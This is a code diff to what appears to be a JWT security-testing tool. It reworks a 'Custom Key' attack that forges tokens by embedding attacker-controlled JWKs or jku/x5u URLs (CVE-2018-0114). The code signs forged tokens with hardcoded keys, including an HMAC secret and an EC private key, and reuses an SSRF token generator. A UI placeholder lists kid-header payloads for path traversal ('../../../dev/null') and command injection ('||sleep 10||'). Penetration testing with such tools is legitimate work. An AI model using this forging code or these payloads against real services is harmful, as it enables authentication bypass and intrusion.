@@ -103,7 +103,7 @@ const vulnerabilities = {
     CustomKey: {
         name: "Custom Key Attack / Public Key Injection via embedded JWK",
         cve: "CVE-2018-0114",
-        description: "Abuses JWT implementations that accept and trust an embedded 'jwk' object directly in the JWT header. An attacker can generate their own key pair, embed the public key in the 'jwk' field, and sign the token with the corresponding private key.",
+        description: "Abuses JWT implementations that accept and trust an embedded 'jwk' object directly in the JWT header. An attacker can generate their own key pair, embed the public key in the 'jwk' field, and sign the token with the corresponding private key, or leave the key empty to use the hardcoded keys.",
         token_amount: 1
     },
     KeyConfusion: {
@@ -2506,12 +2506,19 @@ async function generateVulnerableTokens() {
                 }
                 break;
             case 'CustomKey':
-                if (document.getElementById("testCustomKeyViaURL").checked && !document.getElementById("CustomKeyURL").value) {
-
-                    jwt_attacks_error_message("Please enter a URL for Custom Key attack");
-                    document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
-                    return [];
+                if (document.getElementById("testCustomKeyViaURL").checked) {
+                    if (!document.getElementById("CustomKeyURL").value) {
+                        jwt_attacks_error_message("Please enter a URL for Custom Key attack");
+                        document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
+                        return [];
+                    }
+                    else if (!document.getElementById("CustomKey").value) {
+                        jwt_attacks_error_message("Please enter a Key (JWK) for Custom Key attack");
+                        document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
+                        return [];
+                    }
                 }
+                break;
             case 'Kid':
                 if (document.getElementById("useKidCustomPayloadList").checked && !document.getElementById("kidCustomPayloadList").value) {
                     document.querySelector('#vuln-Kid ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
@@ -3034,8 +3041,9 @@ async function attackCustomKey(token, alg, key = undefined, addCustomKeyViaURL =
         return
     }
     const [header, body, _] = token.split(".")
+    key = key ? JSON.parse(key) : undefined;
     if (alg.startsWith("RS")) {
-        if (!key) key = {
+        if (!key || key.kty !== "RSA") key = {
             "kty": "RSA",
             "alg": alg,
             "kid": "945b6ee8-9547-45c4-b0b9-992906d79f83",
@@ -3050,14 +3058,14 @@ async function attackCustomKey(token, alg, key = undefined, addCustomKeyViaURL =
         }
     }
     else if (alg.startsWith("HS")) {
-        if (!key) key = {
+        if (!key || key.kty !== "oct") key = {
             "kty": "oct",
             "k": "YellowSubmarine",
             "kid": "945b6ee8-9547-45c4-b0b9-992906d79f83"
         }
     }
     else if (alg.startsWith("ES")) {
-        if (!key) key = {
+        if (!key || key.kty !== "EC") key = {
             "alg": alg,
             "crv": "P-256",
             "d": "OBME3fhzbjqqymJ0jbRvmuf5-vTgIavDChAat7TOHy8",
@@ -3068,7 +3076,7 @@ async function attackCustomKey(token, alg, key = undefined, addCustomKeyViaURL =
         }
     }
     else if (alg.startsWith("PS")) {
-        if (!key) key = {
+        if (!key || key.kty !== "RSA") key = {
             "kty": "RSA",
             "alg": alg,
             "kid": "945b6ee8-9547-45c4-b0b9-992906d79f83",
@@ -3110,18 +3118,7 @@ async function attackCustomKey(token, alg, key = undefined, addCustomKeyViaURL =
     let test_cases = []
     let tmp = []
     if (addCustomKeyViaURL && URL) {
-        try {
-            var url_key = (await fetchJwkFromUrl(URL))[0]; // always take the first key
-
-        }
-        catch (e) {
-            jwt_attacks_error_message("attackCustomKey: error fetching key from URL", URL);
-        }
-        if (!url_key) {
-            jwt_attacks_error_message("attackCustomKey: no key found at URL", URL);
-
-        }
-
+        
         // Custom Key Injection via jku/x5u
         // We can just reuse the attack_SSRF function to generate the test cases
         tmp = attack_SSRF(token, URL, isCalledFromCustomKey = true);
@@ -3132,16 +3129,16 @@ async function attackCustomKey(token, alg, key = undefined, addCustomKeyViaURL =
             const body = SSRF_token.testToken.split(".")[1];
 
             if (alg.startsWith("RS")) {
-                var signature = await signRS(header_with_duplicates, body, alg, JSON.stringify(url_key));
+                var signature = await signRS(header_with_duplicates, body, alg, JSON.stringify(key));
             }
             else if (alg.startsWith("HS")) {
-                var signature = await signHS(header_with_duplicates, body, alg, url_key.k);
+                var signature = await signHS(header_with_duplicates, body, alg, key.k);
             }
             else if (alg.startsWith("ES")) {
-                var signature = await signES(header_with_duplicates, body, alg, JSON.stringify(url_key));
+                var signature = await signES(header_with_duplicates, body, alg, JSON.stringify(key));
             }
             else if (alg.startsWith("PS")) {
-                var signature = await signPS(header_with_duplicates, body, alg, JSON.stringify(url_key));
+                var signature = await signPS(header_with_duplicates, body, alg, JSON.stringify(key));
             }
             SSRF_token.testToken = `${header_with_duplicates}.${body}.${signature}`;
             test_cases.push(SSRF_token)
@@ -4158,10 +4155,10 @@ function initVulnerabilitiesList() {
                 <div class="vulnerability-details">${vuln.description}</div>
                 <div class="vulnerability-cve"> <span>${vuln.cve !== 'N/A' ? `${vuln.cve}` : ''}</span></div>
                 ${key === 'KeyConfusion' ? '<input type="text" id="KeyConfusionKey" placeholder="Enter Key (JWK or PEM)" />' : ''}
-                ${key === 'CustomKey' ? '<input type="text" id="CustomKey" placeholder="Enter Key (JWK or PEM)" />' : ''}
+                ${key === 'CustomKey' ? '<input type="text" id="CustomKey" placeholder="Enter Private Key (JWK)" />' : ''}
                 ${key === 'CustomKey' ? '<select id="customKeyAlg"><option value="HS256">HS256</option><option value="RS256">RS256</option><option value="ES256">ES256</option><option value="PS256">PS256</option></select>' : ''}
                 ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" class="inline-checkbox" onchange="change_token_amount_of_parent(this)" id="testAllCustomKeyAlgs" data-token-amount-child="3"/><label for="testAllCustomKeyAlgs">Test all algorithms? (+3) </label></div>' : ''}
-                ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" id="testCustomKeyViaURL" data-token-amount-child="4"/><input type="text" id="CustomKeyURL" placeholder="jku/x5u URL for jwk" /></div>' : ''}
+                ${key === 'CustomKey' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" id="testCustomKeyViaURL" data-token-amount-child="4"/><input type="text" id="CustomKeyURL" placeholder="jku/x5u URL for JWK" /></div>' : ''}
                 ${key === 'SSRF' ? '<input type="text" id="SSRFURL" placeholder="http://localhost:8080" />' : ''}
                 ${key === 'Kid' ? '<div class="inline-checkbox"><input type="checkbox" onchange="change_token_amount_of_parent(this)" class="inline-checkbox" data-token-amount-child="0" id="useKidCustomPayloadList"/><textarea id="kidCustomPayloadList" rows="4" onchange="updateKidTokenCount(this)" placeholder="kid_payload;[expected_key(Base64)]&#10;foo;bar&#10;../../../dev/null;\\0&#10;||sleep 10||"></textarea></div>' : ''}
                 </div>
